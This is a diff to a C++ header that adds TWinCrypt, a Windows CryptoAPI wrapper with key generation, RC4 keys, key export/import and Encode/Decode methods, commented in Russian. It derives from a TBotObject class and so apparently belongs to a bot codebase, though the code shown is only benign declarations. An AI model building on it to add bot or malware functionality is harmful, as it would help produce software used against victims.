@@ -186,5 +186,60 @@ namespace UIDCrypt
 }
 
 
+
+//*********************************************************************
+//  Базовый класс для шифрования используя CryptoApi
+//*********************************************************************
+class TWinCrypt : public TBotObject
+{
+protected:
+	HCRYPTPROV FProvider;
+	bool       FProviderAssigned;
+	HCRYPTKEY  FKey;
+	void InitializeProvider(HCRYPTPROV Provider, const char* Container, DWORD Flags);
+	void DestroyKey();
+protected:
+	LPBYTE DoExportKey(HCRYPTKEY ExpKey, DWORD BlobType, DWORD *BufSize);
+	bool   DoImportKey(HCRYPTKEY ExpKey, DWORD BlobType, LPBYTE Buf, DWORD BufSize);
+public:
+
+	TWinCrypt(const char *Container, DWORD Flags);
+	TWinCrypt(HCRYPTPROV Provider);
+	~TWinCrypt();
+    bool GenerateKey(DWORD AlgId, DWORD Flags);
+	bool CreateRC4Key(const char *Password);
+
+    HCRYPTHASH HashData(DWORD Algoritm, const void* Data, DWORD DataLen);
+
+	LPBYTE ExportPrivateKey(const char *ExpPassword, DWORD *BufSize);
+	LPBYTE ExportPublicKey(DWORD *BufSize);
+	bool   ImportPrivateKey(const char *ExpPassword, LPBYTE Buf, DWORD BufSize);
+	bool   ImportPublicKey(LPBYTE Buf, DWORD BufSize);
+
+
+	//--------------------------------------------------------
+	// Encode - Функция шифрует данные
+	// Data - Данные для шифрования
+	// DataSize - Размер данных.
+	// В случае успеха функция выделит память под шифрованный
+	// буфер и вернёт на него указатель. Размер буфера
+	// запишется в переменную DataSize
+	//--------------------------------------------------------
+	LPBYTE Encode(LPBYTE Data, DWORD &DataSize);
+
+	//--------------------------------------------------------
+	//  Decode - функция расшифровывает данные.
+	//  Data - Указатель на блок шифрованных данных
+	//  DataSize - Размер буфера.
+	//  В случае успеха функция вернёт новый размер данных в
+	//  переменную DataSize
+	//--------------------------------------------------------
+	bool Decode(LPBYTE Data, DWORD &DataSize);
+
+	HCRYPTPROV inline Provider()  { return FProvider; }
+	HCRYPTKEY  inline Key()       { return FKey; }
+};
+
+
 //-----------------------------------------------------------------------------
 #endif
